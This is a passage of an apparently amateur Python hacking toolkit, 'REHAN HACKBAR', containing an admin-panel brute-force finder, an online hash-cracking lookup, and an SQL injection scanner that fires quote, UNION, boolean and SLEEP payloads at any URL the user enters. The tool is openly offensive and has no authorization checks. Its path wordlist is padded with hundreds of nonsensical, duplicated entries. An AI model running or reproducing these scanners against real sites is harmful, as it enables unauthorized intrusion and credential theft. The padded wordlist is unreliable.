            "consultant.php",
            "advisor.php",
            "counselor.php",
            "therapist.php",
            "healer.php",
            "doctor.php",
            "physician.php",
            "surgeon.php",
            "nurse.php",
            "practitioner.php",
            "specialist.php",
            "expert.php",
            "technician.php",
            "mechanic.php",
            "operator.php",
            "worker.php",
            "laborer.php",
            "employee.php",
            "staff.php",
            "crew.php",
            "team.php",
            "squad.php",
            "unit.php",
            "force.php",
            "army.php",
            "navy.php",
            "airforce.php",
            "marines.php",
            "coastguard.php",
            "police.php",
            "sheriff.php",
            "marshal.php",
            "ranger.php",
            "trooper.php",
            "agent.php",
            "officer.php",
            "detective.php",
            "investigator.php",
            "inspector.php",
            "examiner.php",
            "auditor.php",
            "assessor.php",
            "appraiser.php",
            "evaluator.php",
            "reviewer.php",
            "critic.php",
            "judge.php",
            "referee.php",
            "umpire.php",
            "arbiter.php",
            "mediator.php",
            "negotiator.php",
            "diplomat.php",
            "ambassador.php",
            "envoy.php",
            "emissary.php",
            "delegate.php",
            "representative.php",
            "spokesperson.php",
            "spokesman.php",
            "spokeswoman.php",
            "leader.php",
            "chief.php",
            "head.php",
            "boss.php",
            "captain.php",
            "commander.php",
            "general.php",
            "admiral.php",
            "colonel.php",
            "major.php",
            "captain.php",
            "lieutenant.php",
            "sergeant.php",
            "corporal.php",
            "private.php",
            "recruit.php",
            "cadet.php",
            "trainee.php",
            "apprentice.php",
            "intern.php",
            "student.php",
            "pupil.php",
            "learner.php",
            "beginner.php",
            "novice.php",
            "newbie.php",
            "rookie.php",
            "greenhorn.php",
            "amateur.php",
            "hobbyist.php",
            "enthusiast.php",
            "fan.php",
            "follower.php",
            "disciple.php",
            "adherent.php",
            "supporter.php",
            "advocate.php",
            "champion.php",
            "defender.php",
            "protector.php",
            "guardian.php",
            "keeper.php",
            "custodian.php",
            "warden.php",
            "watchman.php",
            "sentinel.php",
            "sentry.php",
            "lookout.php",
            "scout.php",
            "spy.php",
            "agent.php",
            "operative.php",
            "asset.php",
            "informant.php",
            "source.php",
            "whistleblower.php",
            "leaker.php",
            "hacker.php",
            "cracker.php",
            "phreaker.php",
            "carder.php",
            "script kiddie.php",
            "black hat.php",
            "white hat.php",
            "gray hat.php",
            "red team.php",
            "blue team.php",
            "purple team.php",
            "threat actor.php",
            "advanced persistent threat.php",
            "nation state.php",
            "hacktivist.php",
            "cyber criminal.php",
            "cyber terrorist.php",
            "insider threat.php",
            "malicious insider.php",
            "compromised account.php",
            "supply chain.php",
            "zero day.php",
            "exploit.php",
            "vulnerability.php",
            "threat.php",
            "risk.php",
            "attack.php",
            "breach.php",
            "incident.php",
            "compromise.php",
            "intrusion.php",
            "penetration.php",
            "infiltration.php",
            "espionage.php",
            "surveillance.php",
            "reconnaissance.php",
            "osint.php",
            "intelligence.php",
            "counterintelligence.php",
            "forensics.php",
            "investigation.php",
            "response.php",
            "recovery.php",
            "remediation.php",
            "mitigation.php",
            "prevention.php",
            "detection.php",
            "monitoring.php",
            "alerting.php",
            "hunting.php",
            "threat hunting.php",
            "deception.php",
            "honeypot.php",
            "honeynet.php",
            "sinkhole.php",
            "blackhole.php",
            "dark web.php",
            "deep web.php",
            "tor.php",
            "i2p.php",
            "freenet.php",
            "vpn.php",
            "proxy.php",
            "tunnel.php",
            "backdoor.php",
            "rootkit.php",
            "trojan.php",
            "virus.php",
            "worm.php",
            "ransomware.php",
            "spyware.php",
            "adware.php",
            "keylogger.php",
            "botnet.php",
            "ddos.php",
            "dos.php",
            "phishing.php",
            "spear phishing.php",
            "whaling.php",
            "vishing.php",
            "smishing.php",
            "social engineering.php",
            "pretexting.php",
            "baiting.php",
            "quid pro quo.php",
            "tailgating.php",
            "shoulder surfing.php",
            "dumpster diving.php",
            "physical security.php",
            "operational security.php",
            "information security.php",
            "cyber security.php",
            "network security.php",
            "application security.php",
            "cloud security.php",
            "iot security.php",
            "mobile security.php",
            "endpoint security.php",
            "data security.php",
            "database security.php",
            "web security.php",
            "api security.php",
            "container security.php",
            "kubernetes security.php",
            "devsecops.php",
            "secdevops.php",
            "rugged devops.php",
            "security by design.php",
            "privacy by design.php",
            "zero trust.php",
            "least privilege.php",
            "defense in depth.php",
            "layered security.php",
            "security posture.php",
            "security baseline.php",
            "security standard.php",
            "security framework.php",
            "security policy.php",
            "security procedure.php",
            "security guideline.php",
            "security control.php",
            "security measure.php",
            "security mechanism.php",
            "security feature.php",
            "security function.php",
            "security service.php",
            "security system.php",
            "security architecture.php",
            "security infrastructure.php",
            "security operations.php",
            "security management.php",
            "security governance.php",
            "security compliance.php",
            "security audit.php",
            "security assessment.php",
            "security evaluation.php",
            "security review.php",
            "security test.php",
            "security scan.php",
            "security check.php",
            "security validation.php",
            "security verification.php",
            "security certification.php",
            "security accreditation.php",
            "security authorization.php",
            "security clearance.php",
            "security awareness.php",
            "security training.php",
            "security education.php",
            "security culture.php",
            "security mindset.php",
            "security consciousness.php",
            "security hygiene.php",
            "security practice.php",
            "security habit.php",
            "security behavior.php",
            "security action.php",
            "security decision.php",
            "security strategy.php",
            "security planning.php",
            "security program.php",
            "security project.php",
            "security initiative.php",
            "security mission.php",
            "security vision.php",
            "security goal.php",
            "security objective.php",
            "security target.php",
            "security metric.php",
            "security kpi.php",
            "security indicator.php",
            "security measurement.php",
            "security analytics.php",
            "security intelligence.php",
            "security data.php",
            "security information.php",
            "security knowledge.php",
            "security wisdom.php",
            "security insight.php",
            "security understanding.php",
            "security awareness.php",
            "security consciousness.php",
            "security alertness.php",
            "security vigilance.php",
            "security watchfulness.php",
            "security carefulness.php",
            "security caution.php",
            "security prudence.php",
            "security discretion.php",
            "security judgment.php",
            "security wisdom.php",
            "security experience.php",
            "security expertise.php",
            "security skill.php",
            "security ability.php",
            "security capability.php",
            "security capacity.php",
            "security competency.php",
            "security proficiency.php",
            "security mastery.php",
            "security excellence.php",
            "security perfection.php",
            "security quality.php",
            "security standard.php",
            "security benchmark.php",
            "security best practice.php",
            "security gold standard.php",
            "security industry standard.php",
            "security international standard.php",
            "security national standard.php",
            "security regulation.php",
            "security law.php",
            "security rule.php",
            "security requirement.php",
            "security obligation.php",
            "security duty.php",
            "security responsibility.php",
            "security accountability.php",
            "security liability.php",
            "security risk.php",
            "security threat.php",
            "security vulnerability.php",
            "security weakness.php",
            "security flaw.php",
            "security defect.php",
            "security bug.php",
            "security issue.php",
            "security problem.php",
            "security concern.php",
            "security challenge.php",
            "security obstacle.php",
            "security barrier.php",
            "security impediment.php",
            "security limitation.php",
            "security constraint.php",
            "security restriction.php",
            "security boundary.php",
            "security perimeter.php",
            "security zone.php",
            "security domain.php",
            "security realm.php",
            "security sphere.php",
            "security scope.php",
            "security range.php",
            "security reach.php",
            "security extent.php",
            "security coverage.php",
            "security protection.php",
            "security defense.php",
            "security shield.php",
            "security guard.php",
            "security safeguard.php",
            "security countermeasure.php",
            "security mitigation.php",
            "security remediation.php",
            "security recovery.php",
            "security resilience.php",
            "security robustness.php",
            "security strength.php",
            "security hardness.php",
            "security toughness.php",
            "security durability.php",
            "security reliability.php",
            "security availability.php",
            "security integrity.php",
            "security confidentiality.php",
            "security privacy.php",
            "security anonymity.php",
            "security pseudonymity.php",
            "security unlinkability.php",
            "security unobservability.php",
            "security transparency.php",
            "security accountability.php",
            "security non-repudiation.php",
            "security authentication.php",
            "security authorization.php",
            "security access control.php",
            "security identity management.php",
            "security privilege management.php",
            "security role management.php",
            "security policy management.php",
            "security key management.php",
            "security certificate management.php",
            "security secret management.php",
            "security password management.php",
            "security credential management.php",
            "security token management.php",
            "security session management.php",
            "security connection management.php",
            "security network management.php",
            "security device management.php",
            "security endpoint management.php",
            "security asset management.php",
            "security inventory management.php",
            "security configuration management.php",
            "security change management.php",
            "security patch management.php",
            "security update management.php",
            "security release management.php",
            "security deployment management.php",
            "security incident management.php",
            "security problem management.php",
            "security event management.php",
            "security log management.php",
            "security information management.php",
            "security data management.php",
            "security records management.php",
            "security document management.php",
            "security content management.php",
            "security knowledge management.php",
            "security risk management.php",
            "security threat management.php",
            "security vulnerability management.php",
            "security exploit management.php",
            "security malware management.php",
            "security spam management.php",
            "security fraud management.php",
            "security abuse management.php",
            "security compliance management.php",
            "security governance management.php",
            "security audit management.php",
            "security assessment management.php",
            "security testing management.php",
            "security training management.php",
            "security awareness management.php",
            "security communication management.php",
            "security collaboration management.php",
            "security coordination management.php",
            "security integration management.php",
            "security performance management.php",
            "security quality management.php",
            "security service management.php",
            "security process management.php",
            "security project management.php",
            "security program management.php",
            "security portfolio management.php",
            "security resource management.php",
            "security time management.php",
            "security cost management.php",
            "security budget management.php",
            "security financial management.php",
            "security procurement management.php",
            "security vendor management.php",
            "security supplier management.php",
            "security partner management.php",
            "security customer management.php",
            "security user management.php",
            "security stakeholder management.php",
            "security expectation management.php",
            "security requirement management.php",
            "security demand management.php",
            "security capacity management.php",
            "security workload management.php",
            "security performance management.php",
            "security efficiency management.php",
            "security effectiveness management.php",
            "security productivity management.php",
            "security utilization management.php",
            "security optimization management.php",
            "security improvement management.php",
            "security innovation management.php",
            "security transformation management.php",
            "security change management.php",
            "security transition management.php",
            "security succession management.php",
            "security continuity management.php",
            "security disaster management.php",
            "security crisis management.php",
            "security emergency management.php",
            "security response management.php",
            "security recovery management.php",
            "security restoration management.php",
            "security reconstruction management.php",
            "security rebuilding management.php",
            "security renewal management.php",
            "security revitalization management.php",
            "security rejuvenation management.php",
            "security regeneration management.php",
            "security renaissance management.php",
            "security rebirth management.php",
            "security restart management.php",
            "security reboot management.php",
            "security refresh management.php",
            "security reset management.php",
            "security reconfiguration management.php",
            "security reorganization management.php",
            "security restructuring management.php",
            "security realignment management.php",
            "security refocusing management.php",
            "security re-prioritization management.php",
            "security reallocation management.php",
            "security redistribution management.php",
            "security rebalancing management.php",
            "security recalibration management.php",
            "security retuning management.php",
            "security reoptimization management.php",
            "security reengineering management.php",
            "security redesign management.php",
            "security redevelopment management.php",
            "security reinvention management.php",
            "security recreation management.php",
            "security replication management.php",
            "security duplication management.php",
            "security cloning management.php",
            "security mirroring management.php",
            "security shadowing management.php",
            "security emulation management.php",
            "security simulation management.php",
            "security modeling management.php",
            "security prototyping management.php",
            "security piloting management.php",
            "security testing management.php",
            "security validation management.php",
            "security verification management.php",
            "security certification management.php",
            "security accreditation management.php",
            "security approval management.php",
            "security acceptance management.php",
            "security adoption management.php",
            "security onboarding management.php",
            "security offboarding management.php",
            "security exit management.php",
            "security termination management.php",
            "security retirement management.php",
            "security disposal management.php",
            "security destruction management.php",
            "security sanitization management.php",
            "security cleansing management.php",
            "security purging management.php",
            "security wiping management.php",
            "security erasure management.php",
            "security deletion management.php",
            "security removal management.php",
            "security extraction management.php",
            "security isolation management.php",
            "security quarantine management.php",
            "security containment management.php",
            "security segregation management.php",
            "security separation management.php",
            "security partitioning management.php",
            "security compartmentalization management.php",
            "security federation management.php",
            "security confederation management.php",
            "security alliance management.php",
            "security partnership management.php",
            "security coalition management.php",
            "security union management.php",
            "security association management.php",
            "security affiliation management.php",
            "security membership management.php",
            "security subscription management.php",
            "security enrollment management.php",
            "security registration management.php",
            "security sign-up management.php",
            "security login management.php",
            "security logout management.php",
            "security session management.php",
            "security connection management.php",
            "security access management.php",
            "security entrance management.php",
            "security admission management.php",
            "security entry management.php",
            "security ingress management.php",
            "security exit management.php",
            "security egress management.php",
            "security gateway management.php",
            "security portal management.php",
            "security doorway management.php",
            "security checkpoint management.php",
            "security turnstile management.php",
            "security barrier management.php",
            "security gate management.php",
            "security fence management.php",
            "security wall management.php",
            "security moat management.php",
            "security trench management.php",
            "security bunker management.php",
            "security vault management.php",
            "security safe management.php",
            "security lockbox management.php",
            "security strongbox management.php",
            "security coffer management.php",
            "security chest management.php",
            "security cabinet management.php",
            "security closet management.php",
            "security locker management.php",
            "security drawer management.php",
            "security compartment management.php",
            "security chamber management.php",
            "security room management.php",
            "security cell management.php",
            "security ward management.php",
            "security wing management.php",
            "security section management.php",
            "security division management.php",
            "security department management.php",
            "security bureau management.php",
            "security office management.php",
            "security agency management.php",
            "security organization management.php",
            "security institution management.php",
            "security establishment management.php",
            "security foundation management.php",
            "security corporation management.php",
            "security company management.php",
            "security firm management.php",
            "security enterprise management.php",
            "security business management.php",
            "security venture management.php",
            "security startup management.php",
            "security incubator management.php",
            "security accelerator management.php",
            "security hub management.php",
            "security center management.php",
            "security facility management.php",
            "security complex management.php",
            "security compound management.php",
            "security campus management.php",
            "security park management.php",
            "security garden management.php",
            "security field management.php",
            "security ground management.php",
            "security lot management.php",
            "security plot management.php",
            "security site management.php",
            "security location management.php",
            "security place management.php",
            "security spot management.php",
            "security point management.php",
            "security position management.php",
            "security station management.php",
            "security post management.php",
            "security base management.php",
            "security camp management.php",
            "security fort management.php",
            "security castle management.php",
            "security palace management.php",
            "security mansion management.php",
            "security house management.php",
            "security home management.php",
            "security residence management.php",
            "security dwelling management.php",
            "security abode management.php",
            "security habitat management.php",
            "security environment management.php",
            "security surroundings management.php",
            "security setting management.php",
            "security context management.php",
            "security situation management.php",
            "security circumstance management.php",
            "security condition management.php",
            "security state management.php",
            "security status management.php",
            "security mode management.php",
            "security phase management.php",
            "security stage management.php",
            "security level management.php",
            "security tier management.php",
            "security layer management.php",
            "security stratum management.php",
            "security class management.php",
            "security category management.php",
            "security type management.php",
            "security kind management.php",
            "security sort management.php",
            "security variety management.php",
            "security form management.php",
            "security version management.php",
            "security edition management.php",
            "security release management.php",
            "security generation management.php",
            "security iteration management.php",
            "security instance management.php",
            "security occurrence management.php",
            "security episode management.php",
            "security incident management.php",
            "security accident management.php",
            "security mishap management.php",
            "security calamity management.php",
            "security catastrophe management.php",
            "security disaster management.php",
            "security tragedy management.php",
            "security crisis management.php",
            "security emergency management.php",
            "security urgency management.php",
            "security exigency management.php",
            "security contingency management.php",
            "security backup management.php",
            "security fallback management.php",
            "security redundancy management.php",
            "security failover management.php",
            "security replication management.php",
            "security mirroring management.php",
            "security shadowing management.php",
            "security archiving management.php",
            "security retention management.php",
            "security preservation management.php",
            "security conservation management.php",
            "security protection management.php",
            "security safeguarding management.php",
            "security sheltering management.php",
            "security shielding management.php",
            "security screening management.php",
            "security filtering management.php",
            "security blocking management.php",
            "security prevention management.php",
            "security deterrence management.php",
            "security discouragement management.php",
            "security inhibition management.php",
            "security prohibition management.php",
            "security ban management.php",
            "security restriction management.php",
            "security limitation management.php",
            "security constraint management.php",
            "security regulation management.php",
            "security control management.php",
            "security governance management.php",
            "security oversight management.php",
            "security supervision management.php",
            "security monitoring management.php",
            "security surveillance management.php",
            "security observation management.php",
            "security inspection management.php",
            "security examination management.php",
            "security investigation management.php",
            "security inquiry management.php",
            "security probe management.php",
            "security audit management.php",
            "security review management.php",
            "security assessment management.php",
            "security evaluation management.php",
            "security appraisal management.php",
            "security analysis management.php",
            "security study management.php",
            "security research management.php",
            "security exploration management.php",
            "security discovery management.php",
            "security detection management.php",
            "security identification management.php",
            "security recognition management.php",
            "security verification management.php",
            "security confirmation management.php",
            "security validation management.php",
            "security authentication management.php",
            "security attestation management.php",
            "security testimony management.php",
            "security evidence management.php",
            "security proof management.php",
            "security demonstration management.php",
            "security manifestation management.php",
            "security indication management.php",
            "security sign management.php",
            "security signal management.php",
            "security symbol management.php",
            "security token management.php",
            "security badge management.php",
            "security credential management.php",
            "security certificate management.php",
            "security diploma management.php",
            "security degree management.php",
            "security license management.php",
            "security permit management.php",
            "security authorization management.php",
            "security clearance management.php",
            "security privilege management.php",
            "security right management.php",
            "security power management.php",
            "security authority management.php",
            "security jurisdiction management.php",
            "security domain management.php",
            "security realm management.php",
            "security territory management.php",
            "security zone management.php",
            "security region management.php",
            "security area management.php",
            "security sector management.php",
            "security segment management.php",
            "security portion management.php",
            "security part management.php",
            "security piece management.php",
            "security component management.php",
            "security element management.php",
            "security factor management.php",
            "security aspect management.php",
            "security facet management.php",
            "security dimension management.php",
            "security perspective management.php",
            "security viewpoint management.php",
            "security standpoint management.php",
            "security angle management.php",
            "security approach management.php",
            "security method management.php",
            "security technique management.php",
            "security procedure management.php",
            "security process management.php",
            "security operation management.php",
            "security activity management.php",
            "security action management.php",
            "security task management.php",
            "security job management.php",
            "security work management.php",
            "security duty management.php",
            "security responsibility management.php",
            "security function management.php",
            "security role management.php",
            "security position management.php",
            "security capacity management.php",
            "security capability management.php",
            "security ability management.php",
            "security skill management.php",
            "security talent management.php",
            "security gift management.php",
            "security genius management.php",
            "security intelligence management.php",
            "security wisdom management.php",
            "security knowledge management.php",
            "security information management.php",
            "security data management.php",
            "security facts management.php",
            "security details management.php",
            "security particulars management.php",
            "security specifics management.php",
            "security features management.php",
            "security characteristics management.php",
            "security attributes management.php",
            "security properties management.php",
            "security qualities management.php",
            "security traits management.php",
            "security aspects management.php",
            "security elements management.php",
            "security components management.php",
            "security constituents management.php",
            "security ingredients management.php",
            "security parts management.php",
            "security pieces management.php",
            "security sections management.php",
            "security divisions management.php",
            "security segments management.php",
            "security portions management.php",
            "security shares management.php",
            "security fractions management.php",
            "security percentages management.php",
            "security ratios management.php",
            "security proportions management.php",
            "security rates management.php",
            "security frequencies management.php",
            "security occurrences management.php",
            "security instances management.php",
            "security cases management.php",
            "security examples management.php",
            "security samples management.php",
            "security specimens management.php",
            "security illustrations management.php",
            "security demonstrations management.php",
            "security proofs management.php",
            "security evidences management.php",
            "security indications management.php",
            "security signs management.php",
            "security signals management.php",
            "security symbols management.php",
            "security representations management.php",
            "security expressions management.php",
            "security statements management.php",
            "security declarations management.php",
            "security announcements management.php",
            "security proclamations management.php",
            "security publications management.php",
            "security releases management.php",
            "security distributions management.php",
            "security dispersions management.php",
            "security disseminations management.php",
            "security propagations management.php",
            "security transmissions management.php",
            "security communications management.php",
            "security correspondences management.php",
            "security messages management.php",
            "security notices management.php",
            "security notifications management.php",
            "security alerts management.php",
            "security warnings management.php",
            "security cautions management.php",
            "security advisories management.php",
            "security bulletins management.php",
            "security reports management.php",
            "security briefings management.php",
            "security updates management.php",
            "security news management.php",
            "security information management.php",
            "security intelligence management.php",
            "security knowledge management.php",
            "security wisdom management.php",
            "security understanding management.php",
            "security comprehension management.php",
            "security grasp management.php",
            "security mastery management.php",
            "security command management.php",
            "security control management.php",
            "security management management.php",
            "security administration management.php",
            "security governance management.php",
            "security oversight management.php",
            "security supervision management.php",
            "security direction management.php",
            "security guidance management.php",
            "security leadership management.php",
            "security management management.php"
        ]
    
    def menu(self):
        while True:
            clear()
            banner()
            print(f"{Colors.OKCYAN}{Colors.BOLD}[ ADMIN PANEL FINDER ]{Colors.ENDC}")
            separator()
            print(f"""
    {Colors.OKGREEN}[1]{Colors.ENDC} Single Target Scan
    {Colors.OKGREEN}[2]{Colors.ENDC} List All Paths
    {Colors.OKGREEN}[3]{Colors.ENDC} Custom Path Scan
    {Colors.OKGREEN}[4]{Colors.ENDC} Generate Wordlist
    {Colors.OKGREEN}[0]{Colors.ENDC} Back to Main Menu
            """)
            choice = prompt("Select an option")
            
            if choice == "1":
                self.single_scan()
            elif choice == "2":
                self.list_paths()
            elif choice == "3":
                self.custom_scan()
            elif choice == "4":
                self.generate_wordlist()
            elif choice == "0":
                break
            else:
                error("Invalid option!")
                time.sleep(1)

    def single_scan(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ ADMIN PANEL SCAN ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (e.g., http://site.com)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        target = target.rstrip('/')
        info(f"Scanning {target} for admin panels...")
        print(f"{Colors.GRAY}Total paths to check: {len(self.common_paths)}{Colors.ENDC}\n")
        
        found = []
        for i, path in enumerate(self.common_paths, 1):
            url = f"{target}/{path}"
            try:
                progress = f"[{i}/{len(self.common_paths)}] Checking {path}"
                sys.stdout.write(f"\r{Colors.GRAY}{progress}{' ' * 30}{Colors.ENDC}")
                sys.stdout.flush()
                
                r = requests.get(url, timeout=3, allow_redirects=True)
                status = r.status_code
                
                if status in [200, 301, 302, 307, 308]:
                    found.append((url, status, len(r.text)))
                    print(f"\n{Colors.OKGREEN}[+] Found: {url} (Status: {status}, Size: {len(r.text)}){Colors.ENDC}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}\n[!] Scan interrupted by user{Colors.ENDC}")
                break
            except:
                pass
        
        separator()
        if found:
            print(f"\n{Colors.OKGREEN}Found {len(found)} potential admin panels:{Colors.ENDC}\n")
            for url, status, size in found:
                print(f"{Colors.WHITE}[+] {url} - Status: {status}, Size: {size}{Colors.ENDC}")
            
            # Save results
            save = prompt("Save results to file? (y/n)")
            if save.lower() == 'y':
                filename = f"admin_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w') as f:
                    f.write(f"# REHAN HACKBAR - Admin Panel Scan Results\n")
                    f.write(f"# Target: {target}\n")
                    f.write(f"# Date: {datetime.now()}\n")
                    f.write(f"# Credit: Syed Rehan | Developer: @rehuux\n\n")
                    for url, status, size in found:
                        f.write(f"{url} - Status: {status}, Size: {size}\n")
                success(f"Results saved to: {filename}")
        else:
            warning("No admin panels found!")
        
        press_enter()

    def list_paths(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ ADMIN PANEL PATHS LIST ]{Colors.ENDC}")
        separator()
        
        print(f"\n{Colors.WARNING}Total available paths: {len(self.common_paths)}{Colors.ENDC}\n")
        
        for i, path in enumerate(self.common_paths, 1):
            print(f"{Colors.OKGREEN}[{i:4d}]{Colors.ENDC} {Colors.WHITE}{path}{Colors.ENDC}")
        
        press_enter()

    def custom_scan(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ CUSTOM PATH SCAN ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL (e.g., http://site.com)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        custom_path = prompt("Enter custom path to check")
        if not custom_path:
            error("No path provided!")
            press_enter()
            return
        
        target = target.rstrip('/')
        url = f"{target}/{custom_path.lstrip('/')}"
        
        try:
            info(f"Checking {url}...")
            r = requests.get(url, timeout=5, allow_redirects=True)
            print(f"\n{Colors.OKGREEN}Status Code:{Colors.ENDC} {r.status_code}")
            print(f"{Colors.OKGREEN}Response Size:{Colors.ENDC} {len(r.text)} bytes")
            print(f"{Colors.OKGREEN}Content Type:{Colors.ENDC} {r.headers.get('Content-Type', 'N/A')}")
            print(f"{Colors.OKGREEN}Server:{Colors.ENDC} {r.headers.get('Server', 'N/A')}")
            
            # Check for login keywords
            login_keywords = ['login', 'password', 'username', 'admin', 'sign in', 'signin', 'auth']
            found_keywords = [kw for kw in login_keywords if kw.lower() in r.text.lower()]
            if found_keywords:
                print(f"\n{Colors.WARNING}Login-related keywords found: {', '.join(found_keywords)}{Colors.ENDC}")
            
            show_response = prompt("Show response preview? (y/n)")
            if show_response.lower() == 'y':
                preview = r.text[:500] + "..." if len(r.text) > 500 else r.text
                print(f"\n{Colors.GRAY}{preview}{Colors.ENDC}")
                
        except Exception as e:
            error(f"Request failed: {str(e)}")
        
        press_enter()

    def generate_wordlist(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ GENERATE WORDLIST ]{Colors.ENDC}")
        separator()
        
        filename = prompt("Enter output filename (default: admin_paths.txt)")
        if not filename:
            filename = "admin_paths.txt"
        
        with open(filename, 'w') as f:
            for path in self.common_paths:
                f.write(f"/{path}\n")
        
        success(f"Wordlist saved to: {filename} ({len(self.common_paths)} paths)")
        press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# MODULE 5: WEB TOOLS
# ─────────────────────────────────────────────────────────────────────────────

class WebTools:
    def menu(self):
        while True:
            clear()
            banner()
            print(f"{Colors.OKCYAN}{Colors.BOLD}[ WEB TOOLS ]{Colors.ENDC}")
            separator()
            print(f"""
    {Colors.OKGREEN}[1]{Colors.ENDC} Hash Decrypter (Online Lookup)
    {Colors.OKGREEN}[2]{Colors.ENDC} SQLi Scanner (Basic)
    {Colors.OKGREEN}[3]{Colors.ENDC} Reverse IP Lookup
    {Colors.OKGREEN}[4]{Colors.ENDC} Subdomain Checker
    {Colors.OKGREEN}[5]{Colors.ENDC} HTTP Headers Viewer
    {Colors.OKGREEN}[6]{Colors.ENDC} SSL/TLS Info
    {Colors.OKGREEN}[7]{Colors.ENDC} Website Technology Detector
    {Colors.OKGREEN}[8]{Colors.ENDC} Port Scanner (Basic)
    {Colors.OKGREEN}[9]{Colors.ENDC} Whois Lookup
    {Colors.OKGREEN}[10]{Colors.ENDC} DNS Lookup
    {Colors.OKGREEN}[0]{Colors.ENDC} Back to Main Menu
            """)
            choice = prompt("Select an option")
            
            if choice == "1":
                self.hash_decrypt()
            elif choice == "2":
                self.sqli_scanner()
            elif choice == "3":
                self.reverse_ip()
            elif choice == "4":
                self.subdomain_check()
            elif choice == "5":
                self.http_headers()
            elif choice == "6":
                self.ssl_info()
            elif choice == "7":
                self.tech_detector()
            elif choice == "8":
                self.port_scan()
            elif choice == "9":
                self.whois_lookup()
            elif choice == "10":
                self.dns_lookup()
            elif choice == "0":
                break
            else:
                error("Invalid option!")
                time.sleep(1)

    def hash_decrypt(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ HASH DECRYPTER ]{Colors.ENDC}")
        separator()
        
        hash_val = prompt("Enter hash to lookup (MD5/SHA1/SHA256/SHA512)")
        if not hash_val:
            error("No hash provided!")
            press_enter()
            return
        
        hash_val = hash_val.strip().lower()
        info(f"Looking up hash: {hash_val}")
        
        # Try multiple online APIs
        apis = [
            ("MD5 Decrypt", f"https://md5.decrypter.it/decrypt.php?h={hash_val}"),
            ("Nitrxgen MD5", f"https://www.nitrxgen.net/md5db/{hash_val}"),
        ]
        
        print(f"\n{Colors.WARNING}Trying online databases...{Colors.ENDC}\n")
        
        for name, url in apis:
            try:
                print(f"{Colors.GRAY}[*] Checking {name}...{Colors.ENDC}")
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and len(r.text) > 0 and len(r.text) < 100:
                    print(f"{Colors.OKGREEN}[+] {name}: {r.text.strip()}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[-] {name}: Not found{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}[-] {name}: Error - {str(e)}{Colors.ENDC}")
        
        # Try hashes.com format
        print(f"\n{Colors.OKCYAN}You can also check manually:{Colors.ENDC}")
        print(f"{Colors.WHITE}  https://hashes.com/en/decrypt/hash{Colors.ENDC}")
        print(f"{Colors.WHITE}  https://md5.gromweb.com/?md5={hash_val}{Colors.ENDC}")
        print(f"{Colors.WHITE}  https://crackstation.net/{Colors.ENDC}")
        print(f"{Colors.WHITE}  https://hashkiller.io/listmanager{Colors.ENDC}")
        
        press_enter()

    def sqli_scanner(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ SQLI SCANNER ]{Colors.ENDC}")
        separator()
        
        target = prompt("Enter target URL with parameter (e.g., http://site.com/page.php?id=1)")
        if not target:
            error("No target provided!")
            press_enter()
            return
        
        info(f"Scanning {target} for SQL injection...")
        separator()
        
        payloads = [
            ("Quote", SQ),
            ("Double Quote", DQ),
            ("Single Quote", f"{SQ}"),
            ("Quote with comment", f"{SQ}--+-"),
            ("AND true", " AND 1=1"),
            ("AND false", " AND 1=2"),
            ("OR true", " OR 1=1"),
            ("OR false", " OR 1=2"),
            ("Time delay", f"{SQ} AND SLEEP(2)--+-"),
            ("Error trigger", f"{SQ}{SQ}"),
            ("Union attempt", " UNION SELECT NULL--+-"),
            ("Stacked query", f"; SELECT SLEEP(2)--"),
            ("Boolean", f"{SQ} AND {SQ}1{SQ}={SQ}1"),
            ("Parenthesis", f"{SQ})"),
            ("Order by", " ORDER BY 1--+-"),
        ]
        
        vuln_indicators = [
            "sql", "mysql", "error", "syntax", "warning", "exception",
            "database", "query", "odbc", "sqlite", "oracle", "mssql",
            "postgresql", "invalid", "unexpected", "fatal"
        ]
        
        found_issues = []
        
        # Baseline request
        try:
            baseline = requests.get(target, timeout=10)
            baseline_text = baseline.text.lower()
            baseline_length = len(baseline.text)
        except Exception as e:
            error(f"Cannot reach target: {str(e)}")
            press_enter()
            return
        
        for name, payload in payloads:
            test_url = f"{target}{payload}" if not target.endswith('=') else f"{target}{payload}"
            try:
                print(f"{Colors.GRAY}[*] Testing {name}...{Colors.ENDC}")
                r = requests.get(test_url, timeout=10)
                
                # Check for error indicators
                response_lower = r.text.lower()
                found_indicators = [ind for ind in vuln_indicators if ind in response_lower and ind not in baseline_text]
                
                if found_indicators:
                    found_issues.append((name, payload, found_indicators))
                    print(f"{Colors.WARNING}[!] Potential issue with '{name}': {', '.join(found_indicators)}{Colors.ENDC}")
                
                # Check for significant length difference
                length_diff = abs(len(r.text) - baseline_length)
                if length_diff > 500 and not found_indicators:
                    print(f"{Colors.WARNING}[!] Significant response length change with '{name}' ({length_diff} bytes){Colors.ENDC}")
                    
            except Exception as e:
                print(f"{Colors.FAIL}[-] Error with '{name}': {str(e)}{Colors.ENDC}")
        
        separator()
        if found_issues:
            warning(f"Found {len(found_issues)} potential SQL injection indicators!")
            for name, payload, indicators in found_issues:
                print(f"{Colors.WHITE}  - {name}: {payload} -> {', '.join(indicators)}{Colors.ENDC}")
        else:
            info("No obvious SQL injection vulnerabilities detected.")
            print(f"{Colors.GRAY}Note: Manual testing is still recommended.{Colors.ENDC}")
        
        press_enter()

    def reverse_ip(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ REVERSE IP LOOKUP ]{Colors.ENDC}")
        separator()
        
        ip = prompt("Enter IP address or domain")
        if not ip:
            error("No input provided!")
            press_enter()
            return
        
        # Try yougetsignal API
        try:
